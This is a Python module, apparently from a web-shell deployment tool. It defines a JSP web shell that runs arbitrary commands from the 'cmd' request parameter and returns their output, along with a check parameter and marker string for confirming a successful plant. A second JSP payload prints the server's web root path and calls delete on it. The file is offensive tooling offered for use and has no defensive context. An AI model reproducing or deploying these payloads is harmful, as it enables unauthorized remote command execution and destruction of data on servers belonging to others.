#author: fyth.cnss@gmail.com

from webshell import *


class JspShell(Webshell):
    _content = '<%@ page import="java.util.*,java.io.*"%>\n' \
               '<%\n' \
               'if (request.getParameter("check") == "1")\n' \
               '    out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23");\n' \
               'if (request.getParameter("{0}") != null)\n' \
               '{\n' \
               '    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n' \
               '    OutputStream os = p.getOutputStream();\n' \
               '    InputStream in = p.getInputStream();\n' \
               '    DataInputStream dis = new DataInputStream(in);\n' \
               '    String disr = dis.readLine();\n' \
               '    while ( disr != null)\n' \
               '    {\n' \
               '        out.println(disr);\n' \
               '        disr = dis.readLine();\n' \
               '    }\n' \
               '\n}' \
               '%>\n'
    _password = 'cmd'
    _check_data = {'check': '1'}
    _keyword = '202cb962ac59075b964b07152d234b70'


class JspVeriry(VerifyShell):
    _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
               '<%@ page import="java.io.*"%>\n' \
               '<%\n' \
               'String path=request.getRealPath("");\n' \
               'out.println(path);\n' \
               'File d=new File(path);\n' \
               'if(d.exists()){\n' \
               '  d.delete();\n' \
               '  }\n' \
               '%>\n' \
               '<% out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23");%>'
    _keyword = '202cb962ac59075b964b07152d234b70'